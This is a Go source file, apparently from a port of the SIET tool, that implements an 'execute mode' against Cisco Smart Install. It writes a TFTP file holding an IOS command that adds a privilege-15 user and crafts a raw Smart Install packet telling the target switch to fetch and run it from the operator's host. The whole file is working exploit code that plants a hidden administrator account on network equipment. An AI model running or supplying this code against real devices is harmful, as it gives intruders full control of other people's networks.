package libs

import (
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
)

// ExecuteMode handles the command execution functionality
func (s *SIETClient) ExecuteMode() {
	if s.Config.IP == "" {
		fmt.Println("Error: No target IP specified for execute mode")
		os.Exit(1)
	}
	
	execFile := s.prepareExecuteFile()
	if execFile == "" {
		fmt.Println("Error: Could not prepare execute file")
		os.Exit(1)
	}
	
	s.executeOnDevice(s.Config.IP, execFile)
}

// prepareExecuteFile prepares the execution file for command execution
func (s *SIETClient) prepareExecuteFile() string {
	tftpDir := "tftp"
	os.MkdirAll(tftpDir, 0755)
	
	// Create default execute file
	execContent := fmt.Sprintf(`"username %s privilege 15 secret 0 %s" "exit"`, 
		s.Config.Username, s.Config.Password)
	
	execPath := filepath.Join(tftpDir, "execute.txt")
	err := os.WriteFile(execPath, []byte(execContent), 0644)
	if err != nil {
		fmt.Printf("Error creating execute file: %v\n", err)
		return ""
	}
	
	return "execute.txt"
}

// executeOnDevice sends execution packet to device
func (s *SIETClient) executeOnDevice(targetIP, execFile string) {
	myIP, err := s.GetLocalIP(targetIP)
	if err != nil {
		fmt.Printf("Error getting local IP: %v\n", err)
		return
	}
	
	if s.Config.PublicIP != "" {
		myIP = s.Config.PublicIP
	}
	
	tftpPath := fmt.Sprintf("tftp://%s/%s", myIP, execFile)
	packet := s.buildExecutePacket(tftpPath)
	
	err = s.SendPacketToDevice(targetIP, packet)
	if err != nil {
		fmt.Printf("Error sending execute packet: %v\n", err)
		return
	}
	
	fmt.Printf("[INFO]: Execute packet sent to %s\n", targetIP)
}

// buildExecutePacket builds the Smart Install packet for command execution
func (s *SIETClient) buildExecutePacket(tftpPath string) []byte {
	// Build execute packet (simplified)
	header := "000000020000000100000005000000d200000001"
	
	headerBytes, _ := hex.DecodeString(header)
	
	// Empty commands
	cmd1Padding := make([]byte, 128)
	cmd2Padding := make([]byte, 264)
	
	// TFTP path
	pathBytes := []byte(tftpPath)
	pathPadding := make([]byte, 131-len(pathBytes))
	terminator := []byte{0x01}
	
	packet := append(headerBytes, cmd1Padding...)
	packet = append(packet, cmd2Padding...)
	packet = append(packet, pathBytes...)
	packet = append(packet, pathPadding...)
	packet = append(packet, terminator...)
	
	return packet
}
